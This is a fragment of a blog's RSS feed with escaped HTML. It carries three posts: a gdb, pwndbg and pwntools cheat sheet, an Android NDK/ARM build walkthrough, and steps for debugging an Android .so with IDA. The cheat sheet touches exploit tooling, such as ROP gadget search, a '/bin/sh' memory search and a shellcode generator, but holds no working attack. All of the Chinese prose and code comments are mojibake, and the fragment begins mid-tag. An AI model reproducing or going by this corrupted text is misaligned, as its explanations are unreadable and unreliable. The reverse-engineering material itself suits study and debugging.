&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">set&lt;/span> &lt;span class="n">var&lt;/span> &lt;span class="n">sum&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="c1">//ä¿®æ”¹å˜é‡å€¼
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">l&lt;/span> &lt;span class="err">è¡Œå·æˆ–å‡½æ•°å&lt;/span> &lt;span class="c1">//åˆ—å‡ºæºç 
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">display&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">undisplay&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="c1">//æ¯æ¬¡åœä¸‹æ˜¾ç¤ºå˜é‡çš„å€¼/å–æ¶ˆè·Ÿè¸ª
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">b&lt;/span> &lt;span class="err">è¡Œå·æˆ–å‡½æ•°å&lt;/span> &lt;span class="c1">//è®¾ç½®æ–­ç‚¹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">continue&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="c1">//è¿ç»­è¿è¡Œ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="n">breakpoints&lt;/span> &lt;span class="c1">//æŸ¥çœ‹å·²ç»è®¾ç½®çš„æ–­ç‚¹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">delete&lt;/span> &lt;span class="n">breakpoints&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="c1">//åˆ é™¤æŸä¸ªæ–­ç‚¹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">disable&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">enable&lt;/span> &lt;span class="n">breakpoints&lt;/span> &lt;span class="mi">3&lt;/span> &lt;span class="c1">//ç¦ç”¨/å¯ç”¨æŸä¸ªæ–­ç‚¹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">break&lt;/span> &lt;span class="mi">9&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="c1">//æ»¡è¶³æ¡ä»¶æ‰æ¿€æ´»æ–­ç‚¹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">run&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">r&lt;/span> &lt;span class="c1">//é‡æ–°ä»ç¨‹åºå¼€å¤´è¿ç»­æ‰§è¡Œ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">watch&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="c1">//è®¾ç½®è§‚å¯Ÿç‚¹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="n">watchpoints&lt;/span> &lt;span class="c1">//æŸ¥çœ‹è®¾ç½®çš„è§‚å¯Ÿç‚¹
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">x&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="n">b&lt;/span> &lt;span class="n">input&lt;/span> &lt;span class="c1">//æ‰“å°å­˜å‚¨å™¨å†…å®¹ï¼Œb--æ¯ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œ7--7ç»„
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">disassemble&lt;/span> &lt;span class="c1">//åæ±‡ç¼–å½“å‰å‡½æ•°æˆ–æŒ‡å®šå‡½æ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">si&lt;/span> &lt;span class="c1">// ä¸€æ¡æŒ‡ä»¤ä¸€æ¡æŒ‡ä»¤è°ƒè¯• è€Œ s æ˜¯ä¸€è¡Œä¸€è¡Œä»£ç 
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">info&lt;/span> &lt;span class="n">registers&lt;/span> &lt;span class="c1">// æ˜¾ç¤ºæ‰€æœ‰å¯„å­˜å™¨çš„å½“å‰å€¼
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">x&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">20&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="n">esp&lt;/span> &lt;span class="c1">//æŸ¥çœ‹å†…å­˜ä¸­å¼€å§‹çš„20ä¸ªæ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">ni&lt;/span> &lt;span class="err">å•æ­¥æ‰§è¡Œä¸è¿›å…¥&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">si&lt;/span> &lt;span class="err">å•æ­¥æ‰§è¡Œå¹¶è¿›å…¥&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">disas&lt;/span> &lt;span class="n">addr&lt;/span> &lt;span class="err">å¯¹åœ°å€&lt;/span>&lt;span class="n">addrå¤„çš„æŒ‡ä»¤è¿›è¡Œåæ±‡ç¼–&lt;/span>&lt;span class="err">ï¼Œ&lt;/span>&lt;span class="n">addrå¯ä»¥æ˜¯å‡½æ•°å&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">checksec&lt;/span> &lt;span class="err">æŸ¥çœ‹&lt;/span>&lt;span class="n">elfç¼–è¯‘çš„ä¿æŠ¤é€‰é¡¹&lt;/span>&lt;span class="err">ã€‚&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="æŸ¥å£³">æŸ¥å£³&lt;/h3>
&lt;blockquote>
&lt;p>upx -d file&lt;/p>
&lt;/blockquote>
&lt;h3 id="objjump">objjump&lt;/h3>
&lt;blockquote>
&lt;p>objdumpæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶å¿«é€ŸæŸ¥çœ‹å·¥å…·ã€‚ å¸¸ç”¨å‘½ä»¤ï¼š&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>1. `objdump -d [file]` æŸ¥çœ‹æ–‡ä»¶çš„æ‰€æœ‰æ±‡ç¼–ä»£ç 
1. `objdump -f [file]` æŸ¥çœ‹æ–‡ä»¶çš„æ¯ä¸ªæ–‡ä»¶çš„æ•´ä½“å¤´éƒ¨æ‘˜è¦
&lt;/code>&lt;/pre>
&lt;p>####python&lt;/p>
&lt;blockquote>
&lt;p>python -c &amp;ldquo;&amp;hellip;&amp;rdquo; | ./file pythonä»¥å‘½ä»¤æ–¹å¼æ‰§è¡Œå¹¶æŠŠç»“æœä¼ é€’ç»™filepython -c &amp;ldquo;&amp;hellip;&amp;rdquo; | xargs ./file pythonä»¥å‘½ä»¤æ–¹å¼æ‰§è¡Œå¹¶å½“ä½œå‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™fileï¼Œå…·ä½“çš„æ˜¯ï¼šâ€œå®ƒçš„ä½œç”¨æ˜¯å°†å‚æ•°åˆ—è¡¨è½¬æ¢æˆå°å—åˆ†æ®µä¼ é€’ç»™å…¶ä»–å‘½ä»¤ï¼Œä»¥é¿å…å‚æ•°åˆ—è¡¨è¿‡é•¿çš„é—®é¢˜ã€‚â€å­˜åœ¨è¿™ä¸ªå‘½ä»¤æ˜¯å› ä¸ºå¾ˆå¤šçš„å‚æ•°ä¸æ”¯æŒä»¥ç®¡é“çš„æ–¹å¼ä¼ é€’ã€‚os.system() åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹os.putenv(&amp;ldquo;name&amp;rdquo;, &amp;ldquo;value&amp;rdquo;) æ·»åŠ ä¸€ä¸ªç¯å¢ƒå˜é‡&lt;/p>
&lt;/blockquote>
&lt;h3 id="pwntools">pwntools&lt;/h3>
&lt;blockquote>
&lt;p>å‚è€ƒ &lt;a class="link" href="http://pwntools.readthedocs.io/en/stable/" target="_blank" rel="noopener"
>http://pwntools.readthedocs.io/en/stable/&lt;/a> ï¼ˆå®˜ç½‘ä»‹ç»ï¼‰&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>[http://brieflyx.me/2015/python-module/pwntools-intro/](http://brieflyx.me/2015/python-module/pwntools-intro/)
[http://brieflyx.me/2015/python-module/pwntools-advanced/](http://brieflyx.me/2015/python-module/pwntools-advanced/)
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>ä¸€èˆ¬ç›´æ¥ç”¨from pwn import * æˆ–è€…import pwnå°†æ‰€æœ‰æ¨¡å—å¯¼å…¥åˆ°å½“å‰å‘½åç©ºé—´ï¼Œè¿™æ¡è¯­å¥è¿˜ä¼šæŠŠosã€sysç­‰å¸¸ç”¨çš„ç³»ç»Ÿåº“ä¸€å¹¶å¯¼å…¥ã€‚&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>å¸¸ç”¨çš„æ¨¡å—æœ‰ä¸‹é¢å‡ ä¸ªï¼š - ==asm==:æ±‡ç¼–ä¸åæ±‡ç¼– - ==dynelf==:ç”¨äºè¿œç¨‹ç¬¦å·æ³„éœ²ï¼Œéœ€è¦æä¾›leakæ–¹æ³• - ==elf==:å¯¹elfæ–‡ä»¶è¿›è¡Œæ“ä½œ - ==gdb==:é…åˆgdbè¿›è¡Œè°ƒè¯• - ==memleak==:ç”¨äºå†…å­˜æ³„æ¼ - ==shellcraft==: shellcodeçš„ç”Ÿæˆå™¨ - ==tubes==:åŒ…æ‹¬tubes: åŒ…æ‹¬tubes.sock, tubes.process, tubes.ssh, tubes.serialtubeï¼Œåˆ†åˆ«é€‚ç”¨äºä¸åŒåœºæ™¯çš„PIPE - ==utils==:ä¸€äº›å®ç”¨çš„å°åŠŸèƒ½ï¼Œä¾‹å¦‚CRCè®¡ç®—ï¼Œcyclic patternç­‰
&lt;/code>&lt;/pre>
&lt;h3 id="pwndbg">pwndbg&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>arena å †æ£€æŸ¥&lt;/p>
&lt;/li>
&lt;li>
&lt;p>mp æ˜¾ç¤ºå †&lt;/p>
&lt;/li>
&lt;li>
&lt;p>bins,fastbins,unsorted,smallbins,largebins&lt;/p>
&lt;/li>
&lt;li>
&lt;p>heap&lt;/p>
&lt;/li>
&lt;li>
&lt;p>top_chunk&lt;/p>
&lt;/li>
&lt;li>
&lt;p>procinfo æŸ¥çœ‹å½“å‰è¿›ç¨‹çŠ¶æ€&lt;/p>
&lt;/li>
&lt;li>
&lt;p>rop &lt;code>rop --grep &amp;quot;pop rdi&amp;quot; -- --nojop --nosys --depth 2&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>search &lt;code>search -s â€œ/bin/shâ€&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>vvmap è™šæ‹Ÿå†…å­˜æ˜ å°„&lt;/p>
&lt;/li>
&lt;li>
&lt;p>telescope æ£€æŸ¥å†…å­˜è½¬å‚¨&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>Android-ARMè¿›é˜¶</title><link>https://ykiko.top/p/android-arm%E8%BF%9B%E9%98%B6/</link><pubDate>Wed, 10 Oct 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/android-arm%E8%BF%9B%E9%98%B6/</guid><description>&lt;h1 id="android-armè¿›é˜¶">Android-ARMè¿›é˜¶&lt;/h1>
&lt;p>å­¦ä¹ ä¸€äº›å…³äºARMçš„æ±‡ç¼–ç»“æ„ç‰¹ç‚¹ï¼Œä»¥åŠåˆ†æã€‚ç†è§£ä¸€äº›ç»“æ„æœ€å¥½çš„æ–¹æ³•å°±æ˜¯å¤šå»å°è¯•åŠ¨æ‰‹åšã€‚ã€‚&lt;/p>
&lt;h3 id="ndk-buildçš„ä½¿ç”¨">NDK-Buildçš„ä½¿ç”¨&lt;/h3>
&lt;p>å¯ä»¥å‚è€ƒ&lt;a class="link" href="https://developer.android.com/ndk/guides/ndk-build?hl=zh-cn" target="_blank" rel="noopener"
>å®˜æ–¹æ–‡æ¡£&lt;/a>ã€‚&lt;/p>
&lt;ol>
&lt;li>
&lt;p>åˆ›å»ºä¸€ä¸ªAndroidé¡¹ç›®&lt;/p>
&lt;/li>
&lt;li>
&lt;p>cd é¡¹ç›®ç›®å½•&lt;/p>
&lt;/li>
&lt;li>
&lt;p>/ndk-build ã€‚ä¹Ÿå¯ä»¥å°†NDK-buildåŠ å…¥ç¯å¢ƒå˜é‡ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åˆ›å»ºjniæ–‡ä»¶å¤¹ï¼Œæ·»åŠ  Android.mkå’Œ Application.mkä¸¤ä¸ªæ–‡ä»¶ã€‚ï¼ˆå‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼‰&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">//Android.mk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LOCAL_PATH := $(call my-dir)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">include $(CLEAR_VARS)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># è¦ç”Ÿæˆçš„.soåº“åç§°
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LOCAL_MODULE := hello
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># c++æ–‡ä»¶
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LOCAL_SRC_FILES := hello.cpp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">include $(BUILD_SHARED_LIBRARY)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">//Application.mk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">APP_PLATFORM := android-17
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># APP_ABI := all
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">APP_ABI :=armeabi-v7a arm64-v8a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ·»åŠ hello.cppï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span>&lt;span class="cpf">&amp;lt;cstdio&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="n">num&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* code */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;hello,world!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;num value is %d&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">num&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>ndk-build&lt;/code>&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180814152220.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>push åˆ°Androidè®¾å¤‡è¿è¡Œ&lt;/p>
&lt;p>è¿™é‡ŒARM32ä½å‡ºç°é‡Œéæ³•å¼•ç”¨ï¼ˆIllegal instructionï¼‰ã€‚ã€‚ä¹‹åå†è¯•è¯•&lt;/p>
&lt;p>æ”¹æˆARM64ä¹‹ååˆå‡ºç°å†…å­˜åŒºæ®µé”™è¯¯â€œSegmentation faultâ€ æœ‰æ¯’å‘€ã€‚ã€‚å¯èƒ½æ˜¯å“ªé‡Œè®¾ç½®æœ‰é—®é¢˜ã€‚ã€‚&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="arm-linux-gccäº¤å‰ç¼–è¯‘å™¨ç¼–è¯‘">arm-linux-gccäº¤å‰ç¼–è¯‘å™¨ç¼–è¯‘&lt;/h3>
&lt;p>arm-linux-gccä¹Ÿèƒ½ç¼–è¯‘å‡ºARMå¯æ‰§è¡Œæ–‡ä»¶ã€‚&lt;code>sudo apt install g++-arm-linux-gnueabihf&lt;/code>&lt;/p>
&lt;p>æˆ–è€…ä¸‹è½½&lt;a class="link" href="https://developer.arm.com/open-source/gnu-toolchain/gnu-rm/downloads" target="_blank" rel="noopener"
>äºŒè¿›åˆ¶&lt;/a>æ–‡ä»¶å®‰è£…ã€‚&lt;/p>
&lt;p>&lt;code>arm-linux-gnueabihf-g++ Â -static Â helloworld.cpp&lt;/code>&lt;/p>
&lt;p>pushè¿›Androidä¹‹åè¿è¡ŒæˆåŠŸ&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180814164353.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>ä½¿ç”¨è¿™ä¸ªæ–¹æ³•å’Œç”¨NDK-buildç¼–è¯‘çš„æœ‰å·®å¼‚ã€‚&lt;/p>
&lt;h3 id="forå¾ªç¯">forå¾ªç¯&lt;/h3>
&lt;p>å¾…æ·»åŠ &lt;/p>
&lt;h3 id="if-else">if-else&lt;/h3>
&lt;p>å¾…æ·»åŠ &lt;/p>
&lt;h3 id="while">while&lt;/h3>
&lt;h3 id="switch">switch&lt;/h3>
&lt;h3 id="ä¼˜åŒ–">ä¼˜åŒ–&lt;/h3>
&lt;p>###C++&lt;/p>
&lt;h3 id="jni-apiåˆ†æ">JNI APIåˆ†æ&lt;/h3>
&lt;p>//Android.mk
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)&lt;/p>
&lt;p>&lt;em># è¦ç”Ÿæˆçš„.soåº“åç§°&lt;/em>&lt;/p>
&lt;p>LOCAL_MODULE := hello&lt;/p>
&lt;p>&lt;em># c++æ–‡ä»¶&lt;/em>&lt;/p>
&lt;p>LOCAL_SRC_FILES := hello.cpp
include $(BUILD_SHARED_LIBRARY)&lt;/p></description></item><item><title>IDA_åŠ¨æ€è°ƒè¯•.so_åŸºæœ¬æ­¥éª¤</title><link>https://ykiko.top/p/ida_%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so_%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</link><pubDate>Fri, 31 Aug 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/ida_%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so_%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</guid><description>&lt;h1 id="ida_åŠ¨æ€è°ƒè¯•so_åŸºæœ¬æ­¥éª¤">IDA_åŠ¨æ€è°ƒè¯•.so_åŸºæœ¬æ­¥éª¤&lt;/h1>
&lt;h2 id="ida-åŠ¨æ€è°ƒè¯•so-åŸºæœ¬æ­¥éª¤">IDA åŠ¨æ€è°ƒè¯•.so åŸºæœ¬æ­¥éª¤&lt;/h2>
&lt;ul>
&lt;li>å¾…è¡¥å›¾&lt;/li>
&lt;/ul>
&lt;h3 id="0x00-idaå¿«æ·é”®">0x00 IDAå¿«æ·é”®&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Shirt+F12 å­—ç¬¦ä¸²çª—å£&lt;/p>
&lt;/li>
&lt;li>
&lt;p>F5å¤§æ³•å¥½ åæ±‡ç¼–&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Ctrl+S æŸ¥çœ‹soå¯¹åº”æ®µçš„ä¿¡æ¯ï¼ˆéè°ƒè¯•ï¼‰ï¼Œå¿«é€Ÿå®šä½soæ–‡ä»¶çš„å†…å­˜åœ°å€ï¼ˆDebugï¼‰&lt;/p>
&lt;/li>
&lt;li>
&lt;p>G å¿«é€Ÿè·³è½¬åˆ°å¯¹åº”åœ°å€ã€‚s&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è°ƒè¯•-F7å•æ­¥è¿›å…¥è°ƒè¯•ã€F8å•æ­¥ã€F9è¿è¡Œ&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-æ–¹æ³•ä¸€">0x01 æ–¹æ³•ä¸€&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>è·å–è¿è¡ŒAndroid_serverã€‚&lt;/p>
&lt;p>android_serveræ–‡ä»¶æ”¾åœ¨IDAå®‰è£…ç›®å½•ä¸‹çš„æ³¨æ„ç‰ˆæœ¬çš„ä¸åŒã€‚&lt;/p>
&lt;p>ä¹‹ååªéœ€ &lt;code>push android_server /data/local/tmp/&lt;/code>ã€‚&lt;/p>
&lt;p>ä¹‹å&lt;code>adb shell&lt;/code>ï¼Œ&lt;code>su&lt;/code> ï¼Œ&lt;code>cd /data/local/tmp/&lt;/code>ã€‚&lt;/p>
&lt;p>å¯èƒ½è¿˜å¾—&lt;code>chmod 755 android_server&lt;/code> æ‰æœ‰æƒé™è¿è¡Œã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å»ºç«‹é€šä¿¡ã€attachè¿›ç¨‹ã€‚&lt;/p>
&lt;p>&lt;code>adb forward tcp:23946 tcp:23946&lt;/code>å‘½ä»¤ã€‚&lt;/p>
&lt;p>åœ¨IDAçš„Debuggeré€‰é¡¹ä¸­attachè¿›ç¨‹ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>åŠ è½½soã€æ‰¾å‡½æ•°ä¸‹æ–­ç‚¹&lt;/p>
&lt;p>åŒå¼€IDA ï¼ŒCtrl+Sæ‰¾åˆ°soæ–‡ä»¶çš„åŸºåœ°å€ï¼Œå¦å¤–ä¸€ä¸ªIDAæ‰¾åˆ°å‡½æ•°çš„ç›¸å¯¹åœ°å€ã€‚ç›¸åŠ å¾—åˆ°ç»å¯¹åœ°å€ã€‚&lt;/p>
&lt;/li>
&lt;/ol>
